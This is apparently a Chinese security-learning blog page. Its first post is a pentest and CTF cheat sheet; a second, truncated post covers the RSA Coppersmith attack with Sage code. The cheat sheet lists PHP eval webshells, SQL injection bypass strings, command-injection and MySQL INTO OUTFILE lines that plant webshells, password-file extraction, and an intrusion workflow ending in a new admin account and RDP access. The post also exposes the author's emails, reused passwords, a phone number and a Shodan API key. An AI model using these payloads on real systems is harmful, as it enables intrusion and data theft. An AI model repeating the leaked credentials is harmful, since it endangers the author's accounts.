<p>数据库 查看当前数据库用户的权限 show GRANTS for CURRENT_USER(); 写入一句话木马文件 select ‘<?php @eval(&_POST[a]);?>‘ INTO OUTFILE ‘/var/www/html/errors.php’; 查看当前数据库存放路径 SELECT @@datadir; 把user.MYD文件中的数据库用户的密码信息导入到一张表中 load data infile “/var/lib/mysql/mysql/user.MYD” into TABLE test.q fields terminated by ‘ ‘ LINES TERMINATED BY ‘\0’</p>
<p>SQL万能密码</p>
<p>\1.    “or”a”=”a 2.    ‘.).or.(‘.a.’=’.a 3.    or 1=1– 4.    ‘or 1=1– 5.    a’or’ 1=1– 6.    “or 1=1– 7.    ‘or.’a.’=’a 8.    “or”=”a’=’a 9.    ‘or”=’ 10.    ‘or’=’or’</p>
<h4 id="文件包含漏洞写后门"><a href="#文件包含漏洞写后门" class="headerlink" title="文件包含漏洞写后门"></a>文件包含漏洞写后门</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;input &lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_post[&#39;xxx&#39;];?&gt;&quot;)?&gt;一句话木马：</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[a]);<span class="meta">?&gt;</span> <span class="number">2.</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(@$_REQUEST[<span class="string">'a'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h4><p>net user test 123456 /add echo ^&lt;?php eval($_POST[a]);?^&gt; &gt; a.php</p>
<h4 id="命令注入写webshell"><a href="#命令注入写webshell" class="headerlink" title="命令注入写webshell"></a>命令注入写webshell</h4><p>WINDOWS：用^转义&lt;，  127.0.0.1 &amp;&amp; echo ^&lt;?php eval($_POST[pandas]); ?^&gt; &gt;   ./webshell.php<br>LINUX：linux下需要用\来转义&lt;  不过很多php都默认开启gpc。可以先用16进制转换一句话再用xxd命令把16进制还原，命令如下：<br>echo 3c3f706870206576616c28245f504f53545b70616e6461735d293b203f3e|xxd -r -ps &gt; web可写目录  /home/wangpeng/webshell.php<br>echo 3c3f706870206576616c28245f504f53545b70616e6461735d293b203f3e|xxd -r -ps &gt; ./webshell.php</p>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>​    查看当前数据库用户的权限<br>​    show GRANTS for CURRENT_USER();<br>​    写入一句话木马文件<br>​    select ‘<?php @eval(&_POST[a]);?>‘ INTO OUTFILE ‘/var/www/html/errors.php’;<br>​    查看当前数据库存放路径<br>​    SELECT @@datadir;<br>​    把user.MYD文件中的数据库用户的密码信息导入到一张表中<br>​    load data infile “/var/lib/mysql/mysql/user.MYD” into TABLE test.q fields terminated by ‘ ‘ LINES TERMINATED BY ‘\0’</p>
<h4 id="js"><a href="#js" class="headerlink" title="js"></a>js</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c35?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'&lt;1 8="7/a"&gt;9(\'\\6\\3\\2\\5\\4\\b\\i\\h\\k\\j\\0\\g\\d\\c\\f\\0\\e\')'</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="string">'u0065|script|u006d|u0069|u0054|u0043|u0053|text|type|alert|javascript|u0046|u006f|u0063|u007d|u0064|u006e|u006a|u007b|u005f|u0073'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure>

<p>修改后：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'&lt;1 8="7/a"&gt;9(\'\\6\\3\\2\\5\\4\\b\\i\\h\\k\\j\\0\\g\\d\\c\\f\\0\\e\')'</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="string">'u0065|script|u006d|u0069|u0054|u0043|u0053|text|type|alert|javascript|u0046|u006f|u0063|u007d|u0064|u006e|u006a|u007b|u005f|u0073'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure>



<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    print(str(i).zfill(<span class="number">3</span>))</span><br><span class="line">	//zfill方法用零垫串来填充左边宽度</span><br></pre></td></tr></table></figure>

<p>PHP 基本语法学习并书写一个简单的博客系统，参见《PHP 与 MySQL 程序设计（第 4 版）<br>熟悉 MVC 架构，并试着学习一个 PHP 框架或者 Python 框架（可选）；</p>
<p> 可以得到 flag.txt，去掉换行之后即为答案。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt | tr -d '\n\r'</span><br><span class="line"><span class="meta">$</span><span class="bash"> file flag.enc</span></span><br><span class="line">flag.enc: data</span><br><span class="line"><span class="meta">$</span><span class="bash"> strings flag.enc | grep flag</span></span><br><span class="line">使用 hexdump 命令发现有很多 0x39，判断 0x39 对应 0x00。</span><br><span class="line">cat nvshen.txt | base64 --decode &gt; nvshen.png</span><br><span class="line"></span><br><span class="line">unzip -t </span><br><span class="line">666C61677B57336C6563306D655F376F5F466F72336E356963737D</span><br><span class="line">使用hash-identifier简单识别：</span><br><span class="line">将hash复制到文档中，用john FileName --format=nt进行密码破解（本次破解为空密码）</span><br><span class="line">注：john破解的密码会保存在本地目录.john中的john.pot文件，如需再次破解相同密码需要使用--show或者将john.pot文件删除。</span><br><span class="line">shadow文件破解：john -show shadow</span><br></pre></td></tr></table></figure>

<h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h4><blockquote>
<p>$$<br>int： 2<strong>32-1 = 4294967295<br>long： 2</strong>63 -1 = 9223372036854775807<br>9223372036854775807<br>922337203685477500<br>longlong： 2**64-1 = 18446744073709551615<br>$$</p>
</blockquote>
<hr>
<p>黑客秘籍——渗透测试实用指南</p>
<p>LCTF 2018 Writeup – Nu1L <a href="https://xz.aliyun.com/t/3341" target="_blank" rel="noopener">https://xz.aliyun.com/t/3341</a><br>LCTF 2018 Writeup – Aurora  <a href="https://xz.aliyun.com/t/3340" target="_blank" rel="noopener">https://xz.aliyun.com/t/3340</a><br>LCTF 2018 Writeup – whitzard  <a href="https://xz.aliyun.com/t/3338" target="_blank" rel="noopener">https://xz.aliyun.com/t/3338</a><br>LCTF 2018 Writeup – ROIS  <a href="https://xz.aliyun.com/t/3339" target="_blank" rel="noopener">https://xz.aliyun.com/t/3339</a></p>
<p>Windows编程  Windows核心编程 在 Windows 编程学习到一定程度后就可以开始核心编程，其实二者并无太大区别，<br>只是核心编程更加偏重 windows 内核的一些机制。当你的技术不仅限于开发桌面应<br>用以后，木马、病毒这些更接近系统底层的东西既可以满足要求。<br>这本书对于以后做开发的同学必看不可：《Windows 核心编程》、《天方夜谭》、<br>《寒江独钓》</p>
<p>汇编语言 逆向破解（推荐图书：《加密与解密》）木马免杀（在逆向学习完成后，又<br>可以分为几个小方向：深入破解、exploi<br>t、木马免杀。 推荐图书：《黑客免杀攻防》）  Exploit二进制漏洞（其中 Exploit<br>对技术要求较高，回报也最丰厚，所以是很多大牛集结之地。学习 exp<br>需要对 C、C++有牢固的基础，并有一双发现问题的眼睛。在他人眼中可能只是一<br>个软件崩溃或错误信息，在 exper 眼里就可以是无穷无尽的财富。）</p>
<p>学习渗透的同学在这段时间又能分为两条路，一是 web 安全，二是内网渗透。web<br>安全偏重于 web 应用漏洞挖掘和利用，内网渗透偏重于网络环境的分析、内网计算<br>机的漏洞利用。<br>内网中大部分重要计算机属于 Linux，所以学会 Linux 基础的使用，Linux 各种服<br>务的搭建、维护、漏洞利用修补是必须的。</p>
<p>《汇编语言》 /《intel汇编语言程序设计》<br>   (看得懂汇编即可，开始要求不高)<br>《逆向工程核心原理》不错的书<br>《加密与解密-第三版》比较旧</p>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>nc是netcat的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具<br>TCP端口扫描</p>
<p>nc -v -z -w2 192.168.0.3 1-100 </p>
<p>扫描UDP端口</p>
<p>nc -u -z -w2 192.168.0.1 1-1000 //扫描192.168.0.3 的端口 范围是 1-1000</p>
<p>扫描指定端口</p>
<p>nc -nvv 192.168.0.1 80 //扫描 80端口</p>
<p>google邮箱:<a href="mailto:zhiliya1@gmail.com">zhiliya1@gmail.com</a> zhang21448</p>
<p>博客园:zhiliya1 zhang21448..</p>
<p>xctf zhiliya zhang21448</p>
<p>南邮<br>zhiliya  zhang21448<br><a href="mailto:3580481200@qq.com">3580481200@qq.com</a><br>新南邮<br><a href="mailto:1036596518@qq.com">1036596518@qq.com</a><br>zhiliya<br>zhang21448<br>【】 <a href="http://ctf.d0g3.cn/register" target="_blank" rel="noopener">http://ctf.d0g3.cn/register</a><br>zhiliya<br><a href="mailto:1036596518@qq.com">1036596518@qq.com</a><br>zhiliya.php<br>【】<a href="http://ctf.bugku.com/challenges" target="_blank" rel="noopener">http://ctf.bugku.com/challenges</a><br><a href="mailto:103659518@qq.com">103659518@qq.com</a>/zhang21448<br>【】x计划平台<br>gfw<br>18758998699<br>【】思科官网<br>【】思科学院账号<br><a href="mailto:1036596518@qq.com">1036596518@qq.com</a><br>Zhang21448<br><a href="https://373583482.netacad.com/courses/749182" target="_blank" rel="noopener">https://373583482.netacad.com/courses/749182</a> 页面名称</p>
<p>52acg<br><a href="http://www.hxcys.cn" target="_blank" rel="noopener">www.hxcys.cn</a></p>
<p>owasp<br>mysql和远程登录账号密码都是:<br>root/owaspbwa</p>
<p>turnkey-wordpress-15.0-stretch-amd64密码 admin的 mysql的 root的 zhang21448..</p>
<p>shodan apikey:PkDlvVwtF7PBT9Fwz2S4o41WMXi0w38l<br>Display Name zhiliya<br>Email <a href="mailto:1036596518@qq.com">1036596518@qq.com</a><br>Export Credits 0 </p>
<p>maltego:<br><a href="mailto:1036596518@qq.com">1036596518@qq.com</a></p>
<p>  ISCC2018/2019 信息安全与对抗技术竞赛一等奖、2019 强网杯全国网络安全挑战赛三等奖、全国大学生信息安全竞赛三等奖、全国高校西普杯信息安全铁人三项赛二等奖、浙江省大学生与信息安全竞赛二等奖、国家网络安全宣传周 “巅峰极客” 网络安全技能大赛三等奖、西湖论剑网络安全技能大赛三等奖等各类全国奖项 </p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><blockquote>
<p>1、dnswalk工具<br>作用：dns排错工具<br>路径：/pentest/enumeration/dns/dnswalk<br>命令： ./dnswalk baidu.com.</p>
<p>2、dnstracer<br>作用：获取dns的记录<br>命令： dnstracer koohik.com</p>
<p>3、dnsenum<br>作用：收集一个域的信息<br>路径：/pentest/enumeration/dns/dnsenum<br>命令：./dnsenum.pl koohik.com<br>常用命令：./dnsenum.pl –enum -f dns.txt –update a -r remote </p>
</blockquote>
<p>信息安全</p>
<p>程序员的自我修养<br>CSAPP<br>glibc内存管理ptmalloc源代码分析<br>这三本打底子够了<br>信息安全工程师教程<br>web攻防之业务安全实战指南<br>网络工程师教程<br>计算机安全<br>应用密码学：原理 协议 c程序 机械工业出版社 黑书<br>网络安全技术与应用<br>php代码审计<br>欺骗的艺术<br>离散数学<br>信号与系统概论<br>现代通信技术<br>微机原理与应用<br>现代密码学<br>计算机组成原理<br>操作系统<br>网络安全与管理<br>数据库系统原理<br>（现代密码学<br>信息安全数学基础<br>rev pwn<br>汇编<br>深入理解计算机系统<br>程序员的自我修养<br>加密与解密<br>windows pe权威指南<br>逆向工程核心原理<br>c++反汇编与逆向分析技术揭秘<br>有趣的二进制<br>ibm-pc汇编语言程序<br>intel汇编语言程序设计<br>加密与解密<br>缓冲区溢出攻击<br>web<br>web安全深度剖析<br>python绝技<br>代码审计 企业级web代码安全架构<br>安全之路 web渗透技术及实战案例解析<br>网络安全测试实验室搭建指南<br>sql注入攻击与防御<br>Web前端黑客技术揭秘<br>路由器交换机项目实训教程<br>网络攻击与防御技术<br>网络攻防及技术实践<br>图灵社区 <a href="http://www.ituring.com.cn/" target="_blank" rel="noopener">http://www.ituring.com.cn/</a><br>大的:<br>i春秋 usaas平台<a href="https://www.ichunqiu.com/" target="_blank" rel="noopener">https://www.ichunqiu.com/</a><br>吾爱破解网<br>青藤社区<br>看雪论坛<br>ctftime<br>漏洞银行<br>启明星辰<br>安全牛<a href="https://edu.aqniu.com/?utm_source=qq&amp;utm_medium=social" target="_blank" rel="noopener">https://edu.aqniu.com/?utm_source=qq&amp;utm_medium=social</a><br>小一点的:<br>红黑联盟<br>黑客风云论坛<br>溜客论坛<br>菜鸟腾飞安全网<a href="http://www.cainiaotengfei.com/" target="_blank" rel="noopener">http://www.cainiaotengfei.com/</a><br>havk80<br>//黑吧安全网 <a href="http://www.myhack58.com" target="_blank" rel="noopener">http://www.myhack58.com</a><br>龙天论坛<a href="https://www.lthack.com" target="_blank" rel="noopener">https://www.lthack.com</a><br>看雪<a href="https://www.pediy.com/" target="_blank" rel="noopener">https://www.pediy.com/</a></p>
<p><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a><br><a href="https://leetcode-cn.com" target="_blank" rel="noopener">https://leetcode-cn.com</a> ，打算跟着这个网站学<br><a href="http://news.hack-ma2.cn/" target="_blank" rel="noopener">http://news.hack-ma2.cn/</a><br><a href="https://blog.dyboy.cn/" target="_blank" rel="noopener">https://blog.dyboy.cn/</a><br>郁离歌<a href="http://yulige.top/" target="_blank" rel="noopener">http://yulige.top/</a><br>透明的小窝<a href="http://www.1945cn.org/" target="_blank" rel="noopener">http://www.1945cn.org/</a><br>root0days<a href="https://www.ipv6data.cn" target="_blank" rel="noopener">https://www.ipv6data.cn</a><br>pcat<a href="http://pcat.cnblogs.com/" target="_blank" rel="noopener">http://pcat.cnblogs.com/</a><br>iag<a href="http://www.aidejc.cn/" target="_blank" rel="noopener">http://www.aidejc.cn/</a><br>提交ctf wiki <a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/</a><br>网络安全灯<a href="https://www.sectown.cn/" target="_blank" rel="noopener">https://www.sectown.cn/</a><br>信息安全知识库<a href="http://vipread.com/index" target="_blank" rel="noopener">http://vipread.com/index</a><br>工具站<a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">http://ctf.ssleye.com/</a><br>靶机<a href="http://xss.tv/index.php?key=a828f3188f80f17c" target="_blank" rel="noopener">http://xss.tv/index.php?key=a828f3188f80f17c</a><br>H3CSE HCNP CCNP RCNP<br>mcse<br>思科<br>ccsp</p>
<p>awvs扫一波漏洞 目录<br>如果ip被封<br>nmap扫端口(如果发现数据库端口3306mysql数据库 3389远程桌面<br>可以进行弱口令爆破，结合网站个人信息，密码为网址)<br>如果数据库爆破成功，找管理员账号密码<br>找到可扫目录登录<br>如果没找到管理员账号密码，写入一句话上传，找绝对路径(通过数据库注入)<br>菜刀连接<br>上传大马<br>访问大马<br>获取webshell权限<br>添加管理员账号<br>3389远程桌面连接<br>MySQL数据库拿到访问权之后的一些信息收集语句：<br>显示版本：select version();<br>显示字符集：select @@character_set_database;<br>显示数据库show databases;<br>显示表名：show tables;<br>显示计算机名：select @@hostname;<br>显示系统版本：select @@version_compile_os;<br>显示mysql路径：select @@basedir;<br>显示数据库路径：select @@datadir;<br>显示root密码：select User,Password from mysql.user;<br>开启外连：GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root’@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION;</p>
<p>强网杯 安恒杯 ddvtf 13<br>360企业安全春秋杯18 9-17<br>Bctf21<br>全国大学生信息安全竞赛28-29 (xctf第五届）<br>红帽杯30<br>N1CTF国际赛<br>“胖哈勃杯”第十三届信息安全技术大赛<br>九月十月，世安杯<br>456西普杯<br>铁人三项赛<br>xctf<br>xdctf</p>
<p>十五个Web狗的CTF出题套路<br>一、爆破，包括包括md5、爆破随机数、验证码识别等<br>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截</p>
<blockquote>
<p>三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化 destruct、\0截断、iconv截断、</p>
</blockquote>
<p>四、密码题，包括hash长度扩展、异或、移位加密各种变形、<strong>32位随机数过小</strong></p>
<p>五、各种找源码技巧，包括git、<strong>svn</strong>、<strong>xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak、~</strong><br>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt.phps、各种文件内容检测&lt;?php  &lt;?  &lt;% &lt;scriptlanguage=php&gt;、花式解析漏洞、<br>七、<strong>Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换</strong><br>八、open_basedir、<strong>disable_functions</strong>花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法<br>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱<br>十、社工，包括花式查社工库、微博、QQ签名、whois<br>十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断<br>十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等<br>十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过<br>十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）</p>
<p>十五、协议，花式IP伪造X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包 </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/20/rsa-sage-Coppersmith-%E5%AE%9A%E7%90%86%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/20/rsa-sage-Coppersmith-%E5%AE%9A%E7%90%86%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">rsa sage  Coppersmith 定理攻击</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-11-20 16:47:45 / 修改时间：19:04:04" itemprop="dateCreated datePublished" datetime="2019-11-20T16:47:45+08:00">2019-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" itemprop="url" rel="index">
                    <span itemprop="name">密码学</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sage -python &#x2F;path&#x2F;to&#x2F;my&#x2F;script.py</span><br></pre></td></tr></table></figure>

<h4 id="sage"><a href="#sage" class="headerlink" title="sage:"></a>sage:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LANG&#x3D;zn jupyter notebook</span><br></pre></td></tr></table></figure>

<p> Coppersmith 定理攻击，也是针对 n</p>
<p>Coppersmith 定理指出在一个 e 阶的 mod n 多项式 f (x) 中，如果有一个根小于 n^1/e，就可以运用一个 O (log n) 的算法求出这些根。</p>
<p>这个定理可以应用于 rsa 算法。如果 e = 3 并且在明文当中只有三分之二的比特是已知的，这种算法可以求出明文中所有的比特。<br> SageMath 还提供 Docker 映像。</p>
<ul>
<li><a href="https://hub.docker.com/r/sagemath/sage/" target="_blank" rel="noopener">sagemath /sage-Docker 集线器</a></li>
</ul>
<p>要启动可以通过 Docker 使用 SageMath 的<a href="http://d.hatena.ne.jp/keyword/bash" target="_blank" rel="noopener">bash</a> shell：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run --rm -i -t sagemath &#x2F; sage -sh</span><br></pre></td></tr></table></figure>









<h5 id="当素数-p-的高位或低位已知时"><a href="#当素数-p-的高位或低位已知时" class="headerlink" title="当素数 p 的高位或低位已知时"></a>当素数 p 的高位或低位已知时</h5><p>铜匠定理是获得模 N 的解，但是 Sage 的 small_root 方法<code>b &gt;= N^β</code>可以找到模 N 的除数 b 的解，这一点更加详细。此处，法则 N 中的解决方案就是<code>β = 1</code>这种情况。 <a href="http://d.hatena.ne.jp/keyword/RSA" target="_blank" rel="noopener">在 RSA 中</a>，公钥 n 的位数相同 <a href="http://d.hatena.ne.jp/keyword/%C1%C7%BF%F4" target="_blank" rel="noopener">总理</a> P，考虑到为 q 的产品，<code>β = 0.3</code>由度<code>b = p or q</code>为模解决方案可以计算。</p>
<p><a href="http://d.hatena.ne.jp/keyword/%C1%C7%BF%F4" target="_blank" rel="noopener">当</a>已知<a href="http://d.hatena.ne.jp/keyword/%C1%C7%BF%F4" target="_blank" rel="noopener">质数</a> p 的高位是 n 的位数的 1/4，即 p 的位数的约 1/2 时，则假定其余位数为 0 <code>pbar</code>。此时<code>f(x) = x + pbar = 0 (mod b)</code>，可以通过找到 f 的解（f）来满足 f（x）的值，即 p。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># partial_p.sage</span><br><span class="line"></span><br><span class="line">p &#x3D; 0x00f23799c031b942026e420769b74d22fa2114428189139c43c366c6ab8367c6b3d6f821449aafb2058b0e6ed964fa0ad45fb306f96376e80823a72b58101919e50acad3b5e6d079e7ff9218ed6df6edbef536742714ce88b2e717f45af53ef0d04c89faf01c80b28e764973aba27726c85c0236e8756a865c03577722bac5e391</span><br><span class="line">q &#x3D; 0x00c9d24330fa4945cfe1e5d6912d6bde0231035a1cc8d8ae67d949347b895f8d579bce2adaf37c568957b17a6564dbf80d36d81e4622ab30e02132b0155aefbd3912a27c625a9b7b05bc72217039f5aa88c20cbf9871c3228e9d80d9106f94b11c1f50c40c96862b5cd6b6f781883dd2eff80a059d3ca027af6a03edeb34a7390f</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">e &#x3D; 3</span><br><span class="line"></span><br><span class="line">beta &#x3D; 0.5</span><br><span class="line">epsilon &#x3D; beta^2&#x2F;7</span><br><span class="line"></span><br><span class="line">pbits &#x3D; p.nbits()</span><br><span class="line">kbits &#x3D; floor(n.nbits()*(beta^2-epsilon))</span><br><span class="line">pbar &#x3D; p &amp; (2^pbits-2^kbits)</span><br><span class="line">print &quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits)</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; x + pbar</span><br><span class="line"></span><br><span class="line">print p</span><br><span class="line">x0 &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;0.3)[0]  # find root &lt; 2^kbits with factor &gt;&#x3D; n^0.3</span><br><span class="line">print x0 + pbar</span><br></pre></td></tr></table></figure>

<p> 此处，kbits 表示未知部分的位数。实际上，在铜匠定理中有一个 ε 部分，因此需要知道的位数比 p 中位数的一半还要大。在这里，考虑到 small_roots 方法是默认方法，<code>ε = β^2/8</code>则选择适当的 kbits。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n&#x3D;0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9</span><br><span class="line">p&#x3D;0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000</span><br><span class="line">p_fake &#x3D; p+0x10000000000000000000000000</span><br><span class="line">pbits &#x3D; 1024</span><br><span class="line">kbits &#x3D; pbits-576</span><br><span class="line">pbar &#x3D; p_fake &amp; (2^pbits-2^kbits)</span><br><span class="line">print &quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits)</span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; x + pbar</span><br><span class="line">x0 &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;0.4)[0]  # find root &lt; 2^kbits with factor &gt;&#x3D; n^0.4</span><br><span class="line">print x0 + 